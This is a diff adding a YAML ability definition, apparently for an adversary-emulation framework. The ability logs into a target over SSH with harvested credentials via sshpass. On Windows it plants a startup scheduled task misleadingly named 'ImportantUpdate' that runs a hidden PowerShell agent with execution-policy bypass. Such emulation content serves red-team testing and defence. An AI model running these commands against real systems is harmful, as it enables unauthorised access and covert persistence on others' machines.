@@ -1,0 +1,48 @@
+- delete_payload: true
+  technique_name: Valid Accounts
+  buckets:
+  - initial_access
+  description: This ability connects to the target via SSH by using known credentials
+    and starts the copied agent script.
+  singleton: false
+  technique_id: T10781
+  plugin: bountyhunter
+  repeatable: false
+  privilege: ''
+  access: {}
+  name: Run start_agent script using known SSH credentials
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: bountyhunter.network.ip
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+    - source: host.ssh.user
+      edge: has_ssh_pwd
+      target: host.ssh.pwd
+  - module: plugins.stockpile.app.requirements.basic
+    relationship_match:
+    - source: bountyhunter.network.ip
+      edge: has_ssh_user
+      target: host.ssh.user
+  additional_info: {}
+  executors:
+  - timeout: 60
+    cleanup: []
+    payloads: []
+    uploads: []
+    platform: linux
+    build_target: null
+    variations: []
+    additional_info: {}
+    command: '
+      if [ #{host.os} = Windows ];
+        then sshpass -p #{host.ssh.pwd} ssh #{host.ssh.user}@#{bountyhunter.network.ip} ''schtasks.exe -create -tn ImportantUpdate -f -tr "powershell.exe Set-Location C:\Users\Public; powershell.exe -Windowstyle hidden -ep bypass C:\Users\Public\start_agent.ps1" -sc ONSTART && schtasks.exe -run -tn ImportantUpdate''; 
+      elif [ #{host.os} = Linux ];
+        then sshpass -p #{host.ssh.pwd} ssh #{host.ssh.user}@#{bountyhunter.network.ip} "/bin/bash #{host.file.start_agent}"; 
+      fi;'
+    code: null
+    name: sh
+    language: null
+  tactic: initial_access
+  id: 099ea47f-fa4d-4c2e-a089-601eefecb962
